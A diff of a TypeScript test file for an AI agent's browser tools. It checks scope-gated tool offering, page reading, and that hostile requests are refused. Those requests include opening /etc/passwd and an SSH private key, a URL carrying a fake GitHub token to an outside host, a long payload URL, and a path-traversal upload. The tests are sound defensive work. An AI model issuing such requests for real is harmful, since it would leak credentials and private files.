@@ -86,22 +86,19 @@ function fakeHub(state: { machineId: string; orgId: string }) {
 
 async function browserSetup(options: { judge?: Judge; vision?: boolean; now?: () => number } = {}) {
   const holder: { hub?: MachineCaller } = {};
-  f = await setup({
-    toolSources: [
-      createBrowserToolSource({
-        machines: {
-          hub: {
-            status: (id) => (holder.hub as MachineCaller).status(id),
-            call: (id, request, options) => (holder.hub as MachineCaller).call(id, request, options),
-          },
-        },
-        ...(options.judge ? { judge: options.judge } : {}),
-        ...(options.vision ? { vision: () => true } : {}),
-        ...(options.now ? { now: options.now } : {}),
-        publicUrl: "http://localhost:3000",
-      }),
-    ],
+  const source = createBrowserToolSource({
+    machines: {
+      hub: {
+        status: (id) => (holder.hub as MachineCaller).status(id),
+        call: (id, request, options) => (holder.hub as MachineCaller).call(id, request, options),
+      },
+    },
+    ...(options.judge ? { judge: options.judge } : {}),
+    ...(options.vision ? { vision: () => true } : {}),
+    ...(options.now ? { now: options.now } : {}),
+    publicUrl: "http://localhost:3000",
   });
+  f = await setup({ toolSources: [source] });
   const paired = await pairMachine({ db: f.db, pubsub: f.pubsub }, f.owner.id, f.org.id, { name: "MacBook" });
   await f.db.update(schema.agents).set({ machineId: paired.machineId }).where(eq(schema.agents.id, f.agent.id));
   const fake = fakeHub({ machineId: paired.machineId, orgId: f.org.id });
@@ -119,7 +116,7 @@ async function browserSetup(options: { judge?: Judge; vision?: boolean; now?: ()
     const n = fake.calls.length;
     return () => fake.calls.slice(n).filter((c): c is Act => c.op === "browser.act");
   };
-  return { ...fake, machineId: paired.machineId, ctx, names, call, since };
+  return { ...fake, machineId: paired.machineId, ctx, names, call, since, readPage: source.readPage };
 }
 
 /** What a runner answers a settle, a wait and a look with (and the action itself). */
@@ -133,7 +130,10 @@ test("offered only with browser:use (never through 'all tools') and a machine th
   expect(await b.names()).toEqual([]);
   await grantScopes(f.db, f.org.id, f.agent.id, [{ connectionId: null, scope: "browser:use" }]);
   // Every browser tool but the handoff, which has its own source.
-  expect((await b.names()).sort()).toEqual(BROWSER_TOOLS.filter((n) => n !== "browser_ask_person").sort());
+  // `browser_profile` only comes with a shared profile granted (browser-profiles.test.ts).
+  expect((await b.names()).sort()).toEqual(
+    BROWSER_TOOLS.filter((n) => n !== "browser_ask_person" && n !== "browser_profile").sort(),
+  );
 
   b.s.status = { access: { folders: [], tools: { claude: true, codex: true, commands: true, browser: false } } };
   expect(await b.names()).toEqual([]);
@@ -152,10 +152,20 @@ test("offered only with browser:use (never through 'all tools') and a machine th
   expect(await agentBrowserStatus(f.db, b.hub, f.org.id, f.agent.id)).toMatchObject({ code: "not_reported" });
   // An offline machine still offers them: the call says it's offline.
   b.s.status = { online: false };
-  expect(await b.names()).toHaveLength(BROWSER_TOOLS.length - 1);
+  expect(await b.names()).toHaveLength(BROWSER_TOOLS.length - 2);
   await f.db.update(schema.agents).set({ machineId: null }).where(eq(schema.agents.id, f.agent.id));
   expect(await b.names()).toEqual([]);
   expect(await agentBrowserStatus(f.db, b.hub, f.org.id, f.agent.id)).toMatchObject({ code: "no_machine" });
+});
+
+test("readPage: null without a browser the agent may use, an empty page when the page doesn't open", async () => {
+  const b = await browserSetup();
+  expect(await b.readPage(b.ctx, "https://www.google.com/search?q=x")).toBeNull();
+  await grantScopes(f.db, f.org.id, f.agent.id, [{ connectionId: null, scope: "browser:use" }]);
+  b.s.reply = { success: false, data: null, error: "www.google.com is not in the allowed domains" };
+  expect(await b.readPage(b.ctx, "https://www.google.com/search?q=x")).toEqual({ text: "", url: null });
+  b.s.reply = ok({ snapshot: "Resultados", origin: "https://www.bing.com/search?q=x" });
+  expect((await b.readPage(b.ctx, "https://www.bing.com/search?q=x"))?.text).toContain("Resultados");
 });
 
 test("each tool is one agent-browser command in the agent's session, with its site allowlist", async () => {
@@ -205,6 +215,16 @@ test("each tool is one agent-browser command in the agent's session, with its si
   expect((await b.call("browser_open", { url: "FILE:///etc/passwd" })).isError).toBe(true);
   expect((await b.call("browser_open", { url: "view-source:file:///etc/passwd" })).isError).toBe(true);
   expect((await b.call("browser_tabs", { action: "open", url: "FILE:///Users/x/.ssh/id_rsa" })).isError).toBe(true);
+  // An address carrying a key or a payload is refused before the browser opens it (ADR 0117).
+  const opens = () => b.calls.filter((c) => c.op === "browser.act" && (c.command === "open" || c.command === "tab"));
+  const openedBefore = opens().length;
+  expect((await b.call("browser_open", { url: `https://x.io/?k=ghp_${"A".repeat(36)}` })).data).toMatchObject({
+    code: "outbound.credential",
+  });
+  expect(
+    (await b.call("browser_tabs", { action: "open", url: `https://x.io/?d=${"q".repeat(600)}` })).data,
+  ).toMatchObject({ code: "outbound.long" });
+  expect(opens()).toHaveLength(openedBefore);
   expect(b.calls.filter((c) => c.op === "browser.act" && c.command === "tab" && c.args[0] === "new")).toHaveLength(0);
   expect((await b.call("browser_upload", { target: "e4", path: "../secrets.txt" })).isError).toBe(true);
   expect((await b.call("browser_upload", { target: "e4", path: "/Users/ana/x.pdf" })).isError).toBe(true);
